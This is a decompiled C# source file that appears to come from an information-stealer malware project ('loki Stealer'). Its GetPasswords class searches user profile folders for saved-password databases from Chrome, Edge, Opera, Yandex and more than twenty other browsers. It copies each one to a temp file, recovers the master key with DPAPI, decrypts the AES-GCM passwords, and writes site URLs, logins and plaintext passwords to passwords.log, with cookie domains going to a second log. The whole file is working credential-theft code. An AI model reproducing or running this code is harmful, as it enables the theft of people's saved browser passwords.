using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using Anubis;
using loki.loki.Stealer.Cookies;
using NoFile;

namespace loki.loki.Stealer.Passwords
{
	// Token: 0x02000031 RID: 49
	public static class GetPasswords
	{
		// Token: 0x06000181 RID: 385 RVA: 0x0000A704 File Offset: 0x00008904
		public static void Passwords_Grab(string profilePath, string browser_name, string profile)
		{
			try
			{
				Path.Combine(profilePath, "Login Data");
				GetPasswords.browser_name_list.Add(browser_name);
				GetPasswords.profile_list.Add(profile);
				List<string> list = new List<string>();
				string appDate = Helper.AppDate;
				string localData = Helper.LocalData;
				List<string> list2 = new List<string>();
				list2.Add(appDate);
				list2.Add(localData);
				List<string> list3 = new List<string>();
				foreach (string path in list2)
				{
					try
					{
						list3.AddRange(Directory.GetDirectories(path));
					}
					catch
					{
					}
				}
				foreach (string text in list3)
				{
					string[] array = null;
					try
					{
						list.AddRange(Directory.GetFiles(text, "Login Data", SearchOption.AllDirectories));
						array = Directory.GetFiles(text, "Login Data", SearchOption.AllDirectories);
					}
					catch
					{
					}
					if (array != null)
					{
						foreach (string text2 in array)
						{
							try
							{
								if (File.Exists(text2))
								{
									string text3 = "Unknown";
									foreach (string text4 in GetPasswords.BrowsersName)
									{
										if (text.Contains(text4))
										{
											text3 = text4;
										}
									}
									string sourceFileName = text2;
									string sourceFileName2 = text2 + "\\..\\..\\Local State";
									if (File.Exists(GetPasswords.bd))
									{
										File.Delete(GetPasswords.bd);
									}
									if (File.Exists(GetPasswords.ls))
									{
										File.Delete(GetPasswords.ls);
									}
									File.Copy(sourceFileName, GetPasswords.bd);
									File.Copy(sourceFileName2, GetPasswords.ls);
									SqlHandler sqlHandler = new SqlHandler(GetPasswords.bd);
									new List<GetPasswords.PassData>();
									sqlHandler.ReadTable("logins");
									string text5 = File.ReadAllText(GetPasswords.ls);
									string[] array4 = Regex.Split(text5, "\"");
									int num = 0;
									string[] array3 = array4;
									for (int j = 0; j < array3.Length; j++)
									{
										if (array3[j] == "encrypted_key")
										{
											text5 = array4[num + 2];
											break;
										}
										num++;
									}
									byte[] key = DecryptAPI.DecryptBrowsers(Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(text5)).Remove(0, 5)), null);
									int rowCount = sqlHandler.GetRowCount();
									for (int k = 0; k < rowCount; k++)
									{
										try
										{
											string value = sqlHandler.GetValue(k, 5);
											byte[] bytes = Encoding.Default.GetBytes(value);
											string text6 = "";
											try
											{
												if (value.StartsWith("v10") || value.StartsWith("v11"))
												{
													byte[] iv = bytes.Skip(3).Take(12).ToArray<byte>();
													text6 = AesGcm256.Decrypt(bytes.Skip(15).ToArray<byte>(), key, iv);
												}
												else
												{
													text6 = Encoding.Default.GetString(DecryptAPI.DecryptBrowsers(bytes, null));
												}
											}
											catch
											{
											}
											GetPasswords.credential.Add(string.Concat(new string[]
											{
												"Site_Url : ",
												sqlHandler.GetValue(k, 1).Trim(),
												Environment.NewLine,
												"Login : ",
												sqlHandler.GetValue(k, 3).Trim(),
												Environment.NewLine,
												"Password : ",
												text6.Trim(),
												Environment.NewLine
											}));
											GetPasswords.Cpassword++;
										}
										catch
										{
										}
									}
									foreach (string text7 in GetPasswords.credential)
									{
										GetPasswords.password.Add(string.Concat(new string[]
										{
											"Browser : ",
											text3,
											Environment.NewLine,
											"Profile : ",
											profile,
											Environment.NewLine,
											text7
										}));
									}
									GetPasswords.credential.Clear();
								}
							}
							catch
							{
							}
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000182 RID: 386 RVA: 0x0000ABE8 File Offset: 0x00008DE8
		public static void Write_Passwords()
		{
			using (StreamWriter streamWriter = new StreamWriter(Program.dir + "\\passwords.log"))
			{
				foreach (string value in GetPasswords.password)
				{
					streamWriter.Write(value);
					streamWriter.Write(Environment.NewLine);
				}
				for (int i = 0; i < Steal.passwors.Count<string>(); i++)
				{
					streamWriter.Write(Steal.passwors[i]);
					streamWriter.Write(Environment.NewLine);
				}
			}
			using (StreamWriter streamWriter2 = new StreamWriter(Program.dir + "\\cookieDomains.log"))
			{
				foreach (string value2 in GetCookies.domains)
				{
					streamWriter2.Write(value2);
					streamWriter2.Write(Environment.NewLine);
				}
			}
		}

		// Token: 0x04000071 RID: 113
		public static List<string> profile_list = new List<string>();

		// Token: 0x04000072 RID: 114
		public static List<string> browser_name_list = new List<string>();

		// Token: 0x04000073 RID: 115
		public static List<string> url = new List<string>();

		// Token: 0x04000074 RID: 116
		public static List<string> login = new List<string>();

		// Token: 0x04000075 RID: 117
		public static List<string> password = new List<string>();

		// Token: 0x04000076 RID: 118
		public static List<string> passwors = new List<string>();

		// Token: 0x04000077 RID: 119
		public static List<string> credential = new List<string>();

		// Token: 0x04000078 RID: 120
		private static readonly string bd = Path.GetTempPath() + "\\bd" + Helper.GetHwid() + ".tmp";

		// Token: 0x04000079 RID: 121
		private static readonly string ls = Path.GetTempPath() + "\\ls" + Helper.GetHwid() + ".tmp";

		// Token: 0x0400007A RID: 122
		public static int Cpassword;

		// Token: 0x0400007B RID: 123
		private static readonly string[] BrowsersName = new string[]
		{
			"Chrome",
			"Edge",
			"Yandex",
			"Orbitum",
			"Opera",
			"Amigo",
			"Torch",
			"Comodo",
			"CentBrowser",
			"Go!",
			"uCozMedia",
			"Rockmelt",
			"Sleipnir",
			"SRWare Iron",
			"Vivaldi",
			"Sputnik",
			"Maxthon",
			"AcWebBrowser",
			"Epic Browser",
			"MapleStudio",
			"BlackHawk",
			"Flock",
			"CoolNovo",
			"Baidu Spark",
			"Titan Browser",
			"Google",
			"browser"
		};

		// Token: 0x02000069 RID: 105
		private class PassData
		{
			// Token: 0x17000091 RID: 145
			// (get) Token: 0x06000364 RID: 868 RVA: 0x000145BF File Offset: 0x000127BF
			// (set) Token: 0x06000365 RID: 869 RVA: 0x000145C7 File Offset: 0x000127C7
			public string Url { get; set; }

			// Token: 0x17000092 RID: 146
			// (get) Token: 0x06000366 RID: 870 RVA: 0x000145D0 File Offset: 0x000127D0
			// (set) Token: 0x06000367 RID: 871 RVA: 0x000145D8 File Offset: 0x000127D8
			public string Login { get; set; }

			// Token: 0x17000093 RID: 147
			// (get) Token: 0x06000368 RID: 872 RVA: 0x000145E1 File Offset: 0x000127E1
			// (set) Token: 0x06000369 RID: 873 RVA: 0x000145E9 File Offset: 0x000127E9
			public string Password { get; set; }
		}
	}
}
